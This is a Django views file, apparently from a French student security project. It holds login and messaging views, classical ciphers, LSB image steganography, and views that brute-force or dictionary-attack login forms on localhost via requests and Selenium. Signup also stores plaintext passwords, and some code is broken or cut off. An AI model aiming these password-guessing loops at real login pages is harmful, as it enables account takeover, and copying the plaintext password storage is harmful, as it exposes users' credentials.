from django.shortcuts import render, redirect
from django.http import HttpResponse,  FileResponse
from django.contrib.auth import login,authenticate, logout
from django.contrib.auth.models import User
from .forms import CustomLoginForm
from .models import TodoUserProfile, Message 
from selenium import webdriver
from selenium.webdriver.common.by import By
import time, itertools, mimetypes, string, cv2, tempfile
import numpy as np
import os
from django.core.files.base import ContentFile
from io import BytesIO
from django.core.files.storage import default_storage
from django.utils.text import slugify
import requests
from django.db.models import F




chemin_driver_chrome = ''
chemin_dictionnaire = "C:\password_3char_01.txt"
chemin_dictionnaire1 = "C:\password_5char_number.txt"

caracteres_all = string.ascii_letters + string.digits + string.punctuation
caracteres_number = string.digits
caracteres_un_zero = '01'
password_length1= 3
password_length = 5


def signup(request):
  if User.objects.count() >= 8:
        # Raise a ValueError and return an HTTP response.
      return render(request, 'maxusers.html')
  
  if request.method=='POST':
    uname = request.POST.get('username')
    email = request.POST.get('email')
    pass1 = request.POST.get('password1')
    pass2 = request.POST.get('password2')
    first_name = request.POST.get('first_name')
    last_name = request.POST.get('last_name')

    if pass1!=pass2:
      return HttpResponse("Your passwords do not match.")

    else:
      user = User.objects.create_user(uname, email, pass1)
      user.first_name = first_name
      user.last_name = last_name
      user.save()
      user_profile = TodoUserProfile(user=user, password1=pass1)
      user_profile.save()

            # Connectez l'utilisateur après l'inscription
      login(request, user)
      
      return redirect('login')

  return render(request, 'registration/signup.html')

def Login_nocaptha(request):
    if request.method=='POST':
        username=request.POST.get('username')
        pass1=request.POST.get('password')
        user=authenticate(request,username=username,password=pass1)
        if user is not None:
            login(request,user)
            return redirect('home')
        else:
            return HttpResponse ("Username or Password is incorrect!!!")

    return render (request,'registration/login_nocaptcha.html')

def login_view(request):
    if request.method == 'POST':
        form = CustomLoginForm(data=request.POST)
        if form.is_valid():
            user = form.get_user()
            login(request, user)
            return redirect('home')  # Replace 'home' with your desired URL name.
    else:
        form = CustomLoginForm()
    return render(request, 'registration/login.html', {'form': form})

def Index(request):
    return render (request,'index.html')

def index(request):
    username = request.user.first_name
    return render(request,'home.html',{'username': username})



def HomePage(request):
    return render (request,'home.html')


def logout_view(request):
    logout(request)
    return redirect('login_nocaptha')



#########################################################################
#ataque de dictionnaire de 0 et 1 


def attaque_dictionnaire_un_zero_3char_requests(request):
    if request.method == 'GET':
        return render(request, 'attaque_dictionnaire_zero_un.html')

    if request.method == 'POST':
        username = request.POST.get('username')
        success, password, temp_execution = attaquedictionnaireun_zero_3char_requests(username)

        if success:
            context = {
                'success' : success,
                'password': password,
                'temp_execution': temp_execution
            }
            return render(request, 'attaque_dictionnaire_zero_un.html', context)
        else:
            context = {
                'nosuccess': True,
                'temp_execution': temp_execution,
            }
            return render(request, 'attaque_dictionnaire_zero_un.html', context)    




def attaquedictionnaireun_zero_3char_requests(username):
    with open(chemin_dictionnaire, "r") as f:
        mots_de_passe = f.read().splitlines()
    success = False
    login_url = "http://localhost/cryptobox/login.php"
    session = requests.Session()
    debut_time = time.time()
    for mot in mots_de_passe:
        login_data = {
            "username": username,
            "password": mot
        }
        response = session.post(login_url, data=login_data)
        if response.url == "http://localhost/cryptobox/home.html":
            print(mot)
            fin_time = time.time()
            success = True
            break
        
    fin_time = time.time()
    temp_execution = fin_time - debut_time   
    if success:
        return True, mot, temp_execution
    else:
        return False, None, temp_execution



# attaque par dictionnaire de 0 a 9 
def attaque_dictionnaire_requests(request):
    if request.method == 'GET':
        return render(request, 'attaque_dictionnaire.html')

    if request.method == 'POST':
        username = request.POST.get('username')
        success, password, temp_execution = attaquedictionnaire_requests(username)

        if success:
            context = {
                'success' : success,
                'password': password,
                'temp_execution': temp_execution
            }
            return render(request, 'attaque_dictionnaire.html', context)
        else:
            context = {
                'nosuccess': True,
                'temp_execution': temp_execution,
            }
            return render(request, 'attaque_dictionnaire.html', context)    




def attaquedictionnaire_requests(username):
    with open(chemin_dictionnaire1, "r") as f:
        mots_de_passe = f.read().splitlines()

    success = False
    login_url = "http://localhost/cryptobox/login.php"
    session = requests.Session()
    debut_time = time.time()
    for mot in mots_de_passe:
        login_data = {
            "username": username,
            "password": mot
        }
        response = session.post(login_url, data=login_data)
        if response.url == "http://localhost/cryptobox/home.html":
            print(mot)
            fin_time = time.time()
            success = True
            break

    fin_time = time.time()
    temp_execution = fin_time - debut_time   
    if success:
        return True, mot, temp_execution
    else:
        return False, None, temp_execution









###### views
#attaque par selenium
def attaque_dictionnaire(request):
    if request.method == 'GET':
        return render(request, 'attaque_dictionnaire.html')

    if request.method == 'POST':
        username = request.POST.get('username')
        success, password, temp_execution = attaquedictionnaire(username)

        if success:
            context = {
                'success' : success,
                'password': password,
                'temp_execution': temp_execution
            }
            return render(request, 'attaque_dictionnaire.html', context)
        else:
            context = {
                'nosuccess': True,
                'temp_execution': temp_execution,
            }
            return render(request, 'attaque_dictionnaire.html', context)    


       
            
#### fonction #########
def attaquedictionnaire(username):
    driver = webdriver.Chrome(chemin_driver_chrome)
    debut_time = time.time()

    with open(chemin_dictionnaire1, "r") as f:
        mots_de_passe = f.read().splitlines()

    success = False

    for mot in mots_de_passe:
        driver.get("http://127.0.0.1:8000/login_nocaptha/")
        username_field = driver.find_element(By.NAME, "username")
        password_field = driver.find_element(By.NAME, "password")
        username_field.send_keys(username)
        password_field.send_keys(mot)
        connexion_button = driver.find_element(By.NAME, "button_login")
        connexion_button.click()

        if driver.current_url == "http://127.0.0.1:8000/home/":
            fin_time = time.time()
            success = True
            break

    #driver.quit()
    temp_execution = fin_time - debut_time
    if success:
        return True, mot, temp_execution
    else:
        fin_time = time.time()
        temp_execution = fin_time - debut_time
        return False, None, temp_execution


##########################################################################
## attaque brut force 3 char de 0 et 1

def attaque_brute_force_un_zero_3char_requests(request):
    if request.method == 'GET':
        return render(request, 'brute_force_un_zero_3char.html')

    if request.method == 'POST':
        username = request.POST.get('username')
        success, password, temp_execution = attaquebruteforce__un_zero_3char_requests(username)

        if success:
            context = {
                'success' : success,
                'password': password,
                'temp_execution': temp_execution
            }
            return render(request, 'brute_force_un_zero_3char.html', context)
        else:
            context = {
                'nosuccess': True,
                'temp_execution': temp_execution,
            }
            print('envouer')
            return render(request, 'brute_force_un_zero_3char.html', context) 
        

##############     
def attaquebruteforce__un_zero_3char_requests(username):
    success = False
    login_url = "http://localhost/cryptobox/login.php"
    session = requests.Session()
    debut_time = time.time()
    for password_generer in itertools.product(caracteres_un_zero, repeat=password_length1):
        password1 = ''.join(password_generer)

        login_data = {
            "username": username,
            "password": password1
        }
        print(password1)

        response = session.post(login_url, data=login_data)
        if response.url == "http://localhost/cryptobox/home.html":
            print(password1)
            fin_time = time.time()
            success = True
            break

    fin_time = time.time()
    temp_execution = fin_time - debut_time
    if success:
        return True, password1, temp_execution
    else:
        return False, None, temp_execution





# attaque brut force  number 0 1 2 .. 8 9 
#requests


def attaque_brute_force_number_requests(request):
    if request.method == 'GET':
        return render(request, 'brute_force_number.html')

    if request.method == 'POST':
        username = request.POST.get('username')
        success, password, temp_execution = attaquebruteforce_number_requests(username)

        if success:
            context = {
                'success' : success,
                'password': password,
                'temp_execution': temp_execution
            }
            return render(request, 'brute_force_number.html', context)
        else:
            context = {
                'nosuccess': True,
                'temp_execution': temp_execution,
            }
            return render(request, 'brute_force_number.html', context) 
        

        
def attaquebruteforce_number_requests(username):
    success = False
    login_url = "http://localhost/cryptobox/login.php"
    session = requests.Session()
    debut_time = time.time()
    for password_generer in itertools.product(caracteres_number, repeat=password_length):
        password1 = ''.join(password_generer)
        login_data = {
            "username": username,
            "password": password1
        }
        response = session.post(login_url, data=login_data)
        if response.url == "http://localhost/cryptobox/home.html":
            print(password1)
            fin_time = time.time()
            success = True
            break

    fin_time = time.time()
    temp_execution = fin_time - debut_time
    if success:
        return True, password1, temp_execution
    else:
        return False, None, temp_execution




#fonction 

#########################################################
# attaque brut force  all char 
#requests
def attaque_brute_force_all_char_requests(request):
    if request.method == 'GET':
        return render(request, 'brute_force_all_char.html')

    if request.method == 'POST':
        username = request.POST.get('username')
        success, password, temp_execution = attaquebruteforce_all_char_requests(username)

        if success:
            context = {
                'success' : success,
                'password': password,
                'temp_execution': temp_execution
            }
            return render(request, 'brute_force_all_char.html', context)
        else:
            context = {
                'nosuccess': True,
                'temp_execution': temp_execution,
            }
            return render(request, 'brute_force_all_char.html', context) 

#fonction 

def attaquebruteforce_all_char_requests(username):
    success = False
    login_url = "http://localhost/cryptobox/login.php"
    session = requests.Session()
    debut_time = time.time()
    for password_generer in itertools.product(caracteres_all, repeat=password_length):
        password1 = ''.join(password_generer)
        login_data = {
            "username": username,
            "password": password1
        }

        response = session.post(login_url, data=login_data)
        if response.url == "http://localhost/cryptobox/home.html":
            print(password1)
            fin_time = time.time()
            success = True
            break

    fin_time = time.time()
    temp_execution = fin_time - debut_time
    if success:
        return True, password1, temp_execution
    else:
        return False, None, temp_execution



# view
# selenium  
def attaque_brute_force(request):
    if request.method == 'GET':
        return render(request, 'brute_force.html')

    if request.method == 'POST':
        username = request.POST.get('username')
        success, password, temp_execution = attaquebruteforce(username)

        if success:
            context = {
                'success' : success,
                'password': password,
                'temp_execution': temp_execution
            }
            return render(request, 'brute_force.html', context)
        else:
            context = {
                'nosuccess': True,
                'temp_execution': temp_execution,
            }
            return render(request, 'brute_force.html', context) 



 # fonction           
def attaquebruteforce(username):
    driver = webdriver.Chrome(chemin_driver_chrome) 
    success = False
    debut_time = time.time()
   
    for password_generer in itertools.product(caracteres_all, repeat=password_length):
        password1 = ''.join(password_generer)
        driver.get("http://127.0.0.1:8000/login_nocaptha/")
        username_field = driver.find_element(By.NAME, "username")
        password_field = driver.find_element(By.NAME, "password")
        username_field.send_keys(username)
        password_field.send_keys(password1)
        connexion_button = driver.find_element(By.NAME, "button_login")
        connexion_button.click()

        if driver.current_url == "http://127.0.0.1:8000/home/":
            fin_time = time.time()
            success = True
            break


    temp_execution = fin_time - debut_time
    if success:
        return True, password1, temp_execution
    else:
        return False, None, temp_execution



###################################################################################
# steganographie  encode 


def Steganography_encode(request):
    if request.method == 'POST':
        image = request.FILES['image']
        secret_data = request.POST['secret_data']
        image_name = image.name
        #enregistrer l'image téléchargée sur le disque temporaire de manière temporaire afin de pouvoir 
        # la traiter (dans ce cas, l'encodage) avant de la renvoyer en tant que téléchargement.
        with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as tmpfile:
            #delete=False garantit que le fichier temporaire ne sera pas automatiquement supprimé lorsque 
            # vous le fermerez. Cela signifie que vous pouvez y accéder et le traiter comme un fichier ordinaire.

            for chunk in image.chunks():#Cela parcourt les morceaux (chunks) de données de l'image téléchargée (image). Les fichiers téléchargés via un formulaire web peuvent être divisés en petits morceaux pour économiser de la mémoire, donc cette boucle lit ces morceaux un par un
                tmpfile.write(chunk)# À chaque itération de la boucle, le contenu du morceau (chunk) est écrit dans le fichier temporaire (tmpfile). Ainsi, l'image téléchargée est progressivement enregistrée dans le fichier temporaire.

        encoded_image, error_message = encode(tmpfile.name, secret_data)
        if error_message:
            return render(request, 'Steganographyencode.html', {'error_message': error_message})

        output_image = os.path.join(tempfile.gettempdir(), 'image_encode.png')# prépare le chemin complet pour le fichier de sortie,
        #en utilisant le répertoire temporaire par défaut obtenu à partir , tempfile.gettempdir(): Cela renvoie le répertoire temporaire 
        # par défaut du système d'exploitation. 

        # Enregistrez l'image encodée dans un fichier temporaire
        cv2.imwrite(output_image, encoded_image)
        
        #En résumé, ce code configure l'en-tête de la réponse HTTP pour permettre le téléchargement 
        # d'un fichier image encodée par l'utilisateur, avec un nom de fichier personnalisé.

        # Créez un nom de fichier unique pour l'image téléchargeable avec l'extension .png
        # Utilisez le nom de fichier d'entrée pour générer le nom du fichier de sortie encodé

        base_filename, ext = os.path.splitext(image_name)#utilisé pour séparer le nom de fichier en deux parties :
        #le nom de base du fichier (sans extension) et ext (png, jpg,....) 
        filename = slugify(base_filename) + '_encoded'+ext
        response = FileResponse(open(output_image, 'rb'))#crée une réponse HTTP de type FileResponse en ouvrant 
        #le fichier image encodée (output_image) en mode lecture binaire ('rb'). 
        # Cela permet de lire le contenu du fichier pour qu'il puisse être inclus dans la réponse HTTP.
        response['Content-Disposition'] = f'attachment; filename="{filename}"'# configurer l'en-tête Content-Disposition 
        #de la réponse HTTP. L'en-tête Content-Disposition indique au navigateur comment traiter la réponse. 
        # Dans ce cas, le paramètre 'attachment' indique que le contenu doit être téléchargé en tant que fichier 
        # attaché au lieu d'être affiché directement dans le navigateur. Le paramètre filename spécifie le nom de fichier 
        # sous lequel le fichier sera enregistré sur l'ordinateur de l'utilisateur. Le nom de fichier est extrait de la 
        # variable filename créée précédemment.

        return response

    return render(request, 'Steganographyencode.html')


def encode(image_name, secret_data):
    image = cv2.imread(image_name) 
    n_bytes = image.shape[0] * image.shape[1] * 3 // 8
    if len(secret_data) > (n_bytes - 6):
        return None, "[!] Insufficient bytes, need a bigger image or less data."

    secret_data += "#+--+#"
    binary_secret_data = to_bin(secret_data)
    data_len = len(binary_secret_data) 
    flat_image = image.reshape(-1, 1) 
    for i in range(data_len):
        flat_image[i, :1] = (flat_image[i, :1] & 0xFE) | int(binary_secret_data[i])
    
    image = flat_image.reshape(image.shape)
    return image, None


def to_bin(data):
    conversion_functions = {
        str: lambda x: ''.join(format(ord(i), "08b") for i in x), 
        bytes: lambda x: ''.join(format(i, "08b") for i in x),  # hexadécimal) 
        np.ndarray: lambda x: [format(i, "08b") for i in x], # tableau ex np.array([1, 2])
        int: lambda x: format(x, "08b"), 
        np.uint8: lambda x: format(x, "08b") # est utilisé pour stocker des valeurs de 
    }

    data_type = type(data)
    if data_type in conversion_functions:
        return conversion_functions[data_type](data)
    else:
        raise TypeError("Type not supported.")



#######################################################
#stegano decode 

def Steganography_decode(request):
    if request.method == 'POST':
        image = request.FILES['image']

        # Enregistrez le fichier sur le disque temporaire
        with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as tmpfile:
            for chunk in image.chunks():
                tmpfile.write(chunk)

        # Maintenant, utilisez le chemin du fichier enregistré
        decoded_data = decode(tmpfile.name)

        # Retourne les données décodées
        return render(request, 'Steganographydecode.html',  {'decoded_data': decoded_data })

    return render(request, 'Steganographydecode.html')

def decode(image_name):
    image = cv2.imread(image_name) 
    decoded_data = ""
    binary_data = ""
    flat_image = image.reshape(-1, 1)
    for valeur_cellule in flat_image: 
        binary_data += str(valeur_cellule[-1] & 1)

    all_bytes = [ binary_data[i: i+8] for i in range(0, len(binary_data), 8) ]
    
    for byte in all_bytes:
        decoded_data += chr(int(byte, 2))
        if decoded_data[-6:] == "#+--+#":
            break 
    return decoded_data[:-6]    


#############################################################################################################

from django.shortcuts import render
from django.shortcuts import render, redirect
from django.contrib.auth import login,authenticate,logout
from .forms import *
from .models import *
from django.db.models import Q
from django.contrib.auth import get_user_model

User = get_user_model()
"""
def signup(request):
    if User.objects.count() >= 8:
        # Raise a ValueError and return an HTTP response.
      return render(request, 'maxusers.html')
    if request.method == 'POST':
        form = CustomUserCreationForm(request.POST)
        if form.is_valid():
            form.save()
            username = form.cleaned_data.get('username')
            raw_password = form.cleaned_data.get('password1')
            user = authenticate(username=username, password=raw_password)
            return redirect('login')  # Replace 'home' with your desired URL name.
    else:
        form = CustomUserCreationForm()
    return render(request, 'registration/signup.html', {'form': form})

def login_view(request):
    if request.method == 'POST':
        form = CustomLoginForm(data=request.POST)
        if form.is_valid():
            user = form.get_user()
            login(request, user)
            return redirect('profile')  # Replace 'home' with your desired URL name.
    else:
        form = CustomLoginForm()
    return render(request, 'registration/login.html', {'form': form})
 # Import your Message model here
"""

def sidebar(request):
    username = request.user.nom
    return render(request,'base.html',{'username': username})


def menu(request):
    message_content = request.GET.get('message', '')  # Get the message content from the query parameter
    return render(request, 'decryption/menu2.html', {'message_content': message_content})



def user_messages(request):
    if request.user.is_authenticated:
        # Get the currently authenticated user
        user = request.user
        username = request.user.first_name
        # Retrieve all user's messages by default and order them by timestamp (newest to oldest)
        user_messages = Message.objects.filter(receiver=user).order_by('-timestamp')

        # Handle search queries
        query = request.GET.get('q')  # Get the search query from the URL

        if query:
            # Perform a search using Q objects to match sender name or time
            user_messages = user_messages.filter(
                Q(sender__username__icontains=query) |  # Match sender's name (using 'nom' field)
                Q(timestamp__icontains=query)  # Match time (you can customize this as needed)
            )

        return render(request, 'inbox.html', {'user_messages': user_messages ,'username':username})
    else:
        # Handle the case where the user is not authenticated
        # You can redirect them to a login page or show an error message.
        return render(request, 'login.html')


# decreption of the decalage methode 

def decaler_caractere(caractere, sens):
    decalage=1
    if caractere.isalpha():
        if caractere.islower():
            offset = ord('a')
        else:
            offset = ord('A')
        
        if sens == "right":
            code_ascii_modifie = (ord(caractere) - offset + decalage) % 26 + offset
        else:
            code_ascii_modifie = (ord(caractere) - offset - decalage) % 26 + offset

        return chr(code_ascii_modifie)
    else:
        return caractere
 # Retourne le caractère tel quel s'il n'est pas une lettre
 

def decrypter_message(message, sense):
    direction_encoded = 10 if sense == "left" else 101
        
    parts = message.split("#")
    message_a_dechiffrer = parts[0]
    indication = parts[1]

    if indication[0] == "3":
        if ' ' in message_a_dechiffrer:
            result = decale_phrase(message_a_dechiffrer, sense)
            return result
        else:
            result = decale_phrase_sans_espaces(message_a_dechiffrer, sense)
            return result
    else:
        # Gérez d'autres cas si nécessaire.
        return "Déchiffrement non pris en charge"



from django.http import JsonResponse

def decrypt_message(request):
    if request.method == 'POST':
        encrypted_message = request.POST.get('encrypted_message')
        sense = request.POST.get('sense')
        
        decrypted_message = decrypter_message(encrypted_message, sense)
         # Remove the "#" and what comes after it
        if '#' in decrypted_message:
            decrypted_message = decrypted_message.split('#', 1)[0]
        return JsonResponse({'decrypted_message': decrypted_message})

# decreption of the Affine methode 

def pgcd(a, b):
    # Fonction pour calculer le PGCD (Plus Grand Commun Diviseur) de deux nombres a et b
    while b:
        a, b = b, a % b
    return a

def trouver_inverse_modulaire(a, N):
    # Fonction pour trouver l'inverse modulaire de a modulo N
    if pgcd(a, N) != 1:
        return None  # Si a et N ne sont pas premiers entre eux, l'inverse modulaire n'existe pas
    for x in range(1, N):
        if (a * x) % N == 1:
            return x  # Trouver l'inverse modulaire de a
        
def dechiffrement_affine1(texte_chiffre, a, b):
    texte_clair = ""
    N = 26  # Taille de l'alphabet 
    
    a_inverse = trouver_inverse_modulaire(a, N)  # Trouver l'inverse modulaire de 'a' modulo 26
    if a_inverse is None:
        raise ValueError("La valeur de 'a' n'est pas valide. Assurez-vous que 'a' est premier avec 26.")

    for caractere in texte_chiffre:
        if caractere.isalpha():  # Vérifie si le caractère est une lettre
            est_majuscule = caractere.isupper()
            C = ord(caractere) - ord('A' if est_majuscule else 'a')  # Conversion de la lettre chiffrée en position dans l'alphabet
            P = (a_inverse * (C - b)) % N  # Formule de déchiffrement affine
            texte_clair += chr(P + ord('A' if est_majuscule else 'a'))  # Conversion de la position en lettre d'origine
        else:
            texte_clair += caractere  # Si ce n'est pas une lettre, gardez-le tel quel
    return texte_clair

def inverse_modulaire(a, m):
    g, x, y = pgcd(a, m)
    if g != 1:
        raise ValueError("L'inverse modulaire n'existe pas.")
    else:
        return x % m
    
    
def dechiffrement_affine(message, a, b):
    
    if a == 1 and (b == 0 or b == 26):
        raise ValueError("Erreur : Si a est égal à 1, b ne peut pas être égal à 0 ou 26.")

    if pgcd(a, 26) != 1:
        raise ValueError("Erreur : a doit être premier avec 26 (le nombre d'alphabétisation).")

    # Calculer l'inverse modulaire de 'a' par rapport à 26
    a_inverse = trouver_inverse_modulaire(a, 26)

    texte_dechiffre = ""
    for caractere in message:
        if caractere.isalpha():
            if caractere.isupper():
                X = ord(caractere) - ord('A')
                Y = (a_inverse * (X - b)) % 26
                lettre_decalee = chr(Y + ord('A'))
                texte_dechiffre += lettre_decalee 
            else:
                X = ord(caractere) - ord('a')
                Y = (a_inverse * (X - b)) % 26
                lettre_decalee = chr(Y + ord('a'))
                texte_dechiffre += lettre_decalee 
        else:
            texte_dechiffre += caractere

    return texte_dechiffre

def decrypt_affine(request):
    if request.method == 'POST':
        encrypted_message = request.POST.get('encrypted_message')
        a = int(request.POST.get('a'))
        b = int(request.POST.get('b'))

        decrypted_message = dechiffrement_affine(encrypted_message, a, b)
        # Remove the "#" and what comes after it
        if '#' in decrypted_message:
            decrypted_message = decrypted_message.split('#', 1)[0]
        return JsonResponse({'decrypted_message': decrypted_message})
    
# decreption of the cesar methode 
substitution_table = {
    '#': '!!',
    '!': '@',
    '@': '$',
    '$': '%',
    '%': '&',
    '&': '*',
    '*': '(',
    '(': ')',
    ')': '[',
    '[': ']',
    ']': '{',
    '{': '}',
    '}': '<',
    '<': '>',
    '>': '/',
    '/': '\\',
    '\\': '|',
    '|': '-',
    '-': '+',
    '+': '=',
    '=': ',',
    ',': '.',
    '.': ';',
    ';': ':',
    ':': '?',
    '?': "'",
    "'": '"',
    '"': '`',
    '`': '~',
    '~': '_',
    '_': '^',
    '^': '|',
    ',': '(',
    '|': ')',
    ' ': ' '
}

def dechiffrement_cesar(text, key, direction):
    result = ''
    key = key % 26  # Ensure the key is within the range of the alphabet (0-25)

    for char in text:
        if char == '#':
            break  # Stop deciphering when '#' is encountered
        if char in substitution_table.values():  # Inversez les colonnes pour le décryptage
            result += [k for k, v in substitution_table.items() if v == char][0]
        if char.isalpha():
            shift = key if direction == "right" else -key
            if char.islower():
                result += chr(((ord(char) - ord('a') - shift) % 26) + ord('a'))
            elif char.isupper():
                result += chr(((ord(char) - ord('A') - shift) % 26) + ord('A'))
        elif char.isspace():
            result += char  # Handle spaces

    return result



def decrypt_cesar(request):
    if request.method == 'POST':
        encrypted_message = request.POST.get('encrypted_message')
        decalage = int(request.POST.get('decalage'))
        direction = request.POST.get('direction')

        decrypted_message = dechiffrement_cesar(encrypted_message, decalage, direction)
        # Remove the "#" and what comes after it
        if '#' in decrypted_message:
            decrypted_message = decrypted_message.split('#', 1)[0]
        return JsonResponse({'decrypted_message': decrypted_message})
    
# decreption of the mirror methode 
def mirror(text):
    return text[::-1]

def is_palindrome(a):
    return a == a[::-1]

def crypter_palindrome(mot):
    if len(mot) <= 1:
        return mot
    moitie = len(mot) // 2
    partie_gauche = mot[:moitie][::-1]
    partie_droite = mot[-moitie:][::-1]
    caractere_milieu = mot[moitie] if len(mot) % 2 != 0 else ""
    mot_chiffre = partie_gauche + caractere_milieu + partie_droite
    return mot_chiffre


def decrypter(resultat):
    phrase = resultat.split()  # Séparer la phrase en mots
    mots_inv= phrase[::-1]
    text_dechiffrer = []
    
    for mot in mots_inv :
        Word=mot.lower()
        if is_palindrome(Word):
            
                mot_dechiffre = crypter_palindrome(mot)
                text_dechiffrer.append(mot_dechiffre)
        elif len(Word) == 3:  # Condition spéciale pour les palindromes de trois lettres
            mot_chiffre = mot[0] + mot[2] + mot[1]
            text_dechiffrer.append(mot_chiffre)
            
        else:
            text_dechiffrer.append(mirror(mot))

    return ' '.join(text_dechiffrer)  # Reconstruire la phrase à partir des mots dechiffrés



def decrypt_mirroir(request):
    if request.method == 'POST':
        encrypted_message = request.POST.get('encryptedMessage1')
        if '#' in encrypted_message:
            encrypted_message = encrypted_message.split('#', 1)[0]
        
        decrypted_text = decrypter_mots_palindromes(encrypted_message, crypter)
       


        response_data = {'result': decrypted_text}
       
        return JsonResponse(response_data)

# Partie cryptage

def mirror(text):
    return text[::-1]

def is_palindrome(a):
    return a == a[::-1]


def crypter_palindrome(mot):
    word=mot.lower()
    if len(word) <= 1:
        return mot

    moitie = len(word) // 2
    partie_gauche = mot[:moitie][::-1]
    partie_droite = mot[-moitie:][::-1]
    caractere_milieu = mot[moitie] if len(mot) % 2 != 0 else ""

    mot_chiffre = partie_gauche + caractere_milieu + partie_droite
    return mot_chiffre


def crypter_three(mot):
    word=mot.lower()
    # Convertir le mot en minuscules
    if len(word) == 3:  # Condition spéciale pour les palindromes de trois lettres
        mot_chiffre = mot[0] + mot[2] + mot[1]
        return mot_chiffre
    else:
        return "Le mot n'est pas un palindrome de trois lettres avec la lettre du milieu identique."




def crypter(text):
    mots = text.split()  # Séparer la phrase en mots
     
    mots_inverse= mots[::-1]
    resultat = []

    for mot in mots_inverse :
        Word=mot.lower()
        if is_palindrome(Word):
            if len(Word)==3:
                mot_chiffre = crypter_three(mot)
                resultat.append(mot_chiffre)
            else:  
                mot_chiffre=crypter_palindrome(mot)
                resultat.append(mot_chiffre)
        else:
            resultat.append(mirror(mot))

    return ' '.join(resultat)  # Reconstruire la phrase à partir des mots chiffrés


   



def detecter_mots_palindromes(chaine):
    longueur_minimale = 3
    longueur_chaine = len(chaine)
    palindromes = []

    for i in range(longueur_chaine - longueur_minimale + 1):
        for j in range(i + longueur_minimale, longueur_chaine + 1):
            mot = chaine[i:j]
            if is_palindrome(mot):
                palindromes.append(mot)

    # Supprimer les sous-mots palindromes
    mots_palindromes = []
    for mot in palindromes:
        sous_mot = False
        for autre_mot in palindromes:
            if mot != autre_mot and mot in autre_mot:
                sous_mot = True
                break
        if not sous_mot:
            mots_palindromes.append(mot)
           
    return mots_palindromes

def detecter_mots_non_palindromes(chaine, mots_palindromes):
    for mot in mots_palindromes:
        chaine = chaine.replace(mot, "")
    # Vous pouvez supprimer les espaces en trop après avoir supprimé les mots palindromes
    chaine = " ".join(chaine.split())
    return chaine


def crypter_mots_palindromes(chaine, crypter):
    mots_palindromes = detecter_mots_palindromes(chaine)
    for mot in mots_palindromes:
        chaine = chaine.replace(mot, crypter(mot))
       
    #detecter mot non palindrome et le crypter avec miroir    
    message=chaine
    message=detecter_mots_non_palindromes(message, mots_palindromes)
    if message in chaine:
        chaine_cryptee = chaine.replace(message, message[::-1])
        chaine_cryptee = f"{chaine_cryptee} #2"
        return chaine_cryptee
    else:
        chaine = f"{chaine} #2"
        return chaine
    
def decrypter_mots_palindromes(chaine, crypter):
    mots_palindromes = detecter_mots_palindromes(chaine)
    for mot in mots_palindromes:
        chaine = chaine.replace(mot, crypter(mot))
       
    #detecter mot non palindrome et le crypter avec miroir    
    message=chaine
    message=detecter_mots_non_palindromes(message, mots_palindromes)
    if message in chaine:
        chaine_cryptee = chaine.replace(message, message[::-1])
        return chaine_cryptee
    else:
        return chaine
   
   


methode_codes = {
    0: "césar",
    1: "affine",
    2: "miroir",
    3: "shift"
}
"""
direction={
    "left" : 10,
    "right" :101
}
"""
"""
L'indice sera : #directionmethodecodeclé / #amethodecodeb ( affine)
"""



def ceasar_cipher(text, key, direction, secure=True):
    if secure:
        key = int(key)
        if key < 0:
          return None, "Erreur : Veuillez choisir une clé de décalage positive."
        if key == 0 or key % 26 == 0:
            return None, "Erreur : Veuillez choisir une clé de décalage différente de 0 ou 26."

        direction_encoded = 10 if direction == "left" else 101
        result = ""
        for char in text:
            if char.isalpha():
                if char.islower():
                    base = ord('a')
                else:
                    base = ord('A')

                shifted = ord(char) - base

                if direction == "right":
                    shifted = (shifted + key) % 26
                else:
                    shifted = (shifted - key) % 26

                result += chr(shifted + base)
            elif char.isspace():
                result += char  # Handle spaces
            else:
                if char in substitution_table:
                    result += substitution_table[char]
                else:
                    result += char

        indication = f"0{direction_encoded}{key}"
        encrypted_message = f"{result}#{indication}"

        return encrypted_message, None  # Return the encrypted message and no error message

    return None, None  # If secure is False, return None for both message and error


def decale_mot(mot, decalage, direction):
    if direction == "left":
        return mot[decalage:] + mot[:decalage]
    else:
        return mot[-decalage:] + mot[:-decalage]

def decale_phrase(phrase, direction):
    decalage=1
    mots = phrase.split()
    mots_decales = [decale_mot(mot, decalage, direction) for mot in mots]
    phrase_decalee = ' '.join(mots_decales)
    return phrase_decalee

def decale_phrase_sans_espaces(phrase, direction):
    decalage=1
    phrase_decalee = decale_mot(phrase, decalage, direction)
    return phrase_decalee

def decale_message(message, direction):
    direction_encoded = 10 if direction == "left" else 101
        
    if ' ' in message:
        result = decale_phrase(message, direction)
        indication = f"3{direction_encoded}"
        result = f"{result}#{indication}"
        return result
    else:
        result=decale_phrase_sans_espaces(message, direction)
        indication = f"3{direction_encoded}"
        result = f"{result}#{indication}"
        return result




def pgcd(a, b):
    # Fonction pour calculer le PGCD (Plus Grand Commun Diviseur) de deux nombres a et b
    while b:
        a, b = b, a % b
    return a

def chiffrement_affine(message, a, b):
    """
    Chiffre un message en utilisant le chiffrement affine.
    
    Args:
        message (str): Le message à chiffrer.
        a (int): La première clé de chiffrement.
        b (int): La deuxième clé de chiffrement.

    Returns:
        str: Le message chiffré.
    
    Raises:
        ValueError: Si les paramètres a et b ne sont pas valides.
    """
    if a == 1 and (b == 0 or b %26==0):
        return None, "Erreur : Si a est égal à 1, b ne peut pas être égal à 0 ou un multiple de 26."

    if pgcd(a, 26) != 1:
        return None, "Erreur : a doit être premier avec 26 (le nombre d'alphabétisation)."
    
    

    texte_chiffre = ""
    for caractere in message:
        if caractere.isalpha():
            if caractere.isupper():
                X = ord(caractere) - ord('A')
                Y = (a * X + b) % 26
                lettre_decalee = chr(Y + ord('A'))
                texte_chiffre += lettre_decalee 
            else:
                X = ord(caractere) - ord('a')
                Y = (a * X + b) % 26
                lettre_decalee = chr(Y + ord('a'))
                texte_chiffre += lettre_decalee 
        else:
            texte_chiffre += caractere
    indication = f"1{a}{b}"
    texte_chiffre = f"{texte_chiffre}#{indication}"
    return texte_chiffre,None




def compose_message(request):
    
    username = request.user.first_name
    error_message = None
    if request.method == 'POST':
        form = MessageForm(request.POST)
        if form.is_valid():
            message = form.save(commit=False)
            message.receiver = form.cleaned_data['receiver']
            message.sender = request.user
            content = form.cleaned_data['content']

            # Get the encryption information from the form
            encryption_method = form.cleaned_data['encryption_method']
            

            if encryption_method == 'cesar':
                encryption_key = form.cleaned_data['encryption_key']
                encryption_direction = form.cleaned_data['encryption_direction']

                if encryption_key is not None and encryption_direction in ('left', 'right'):
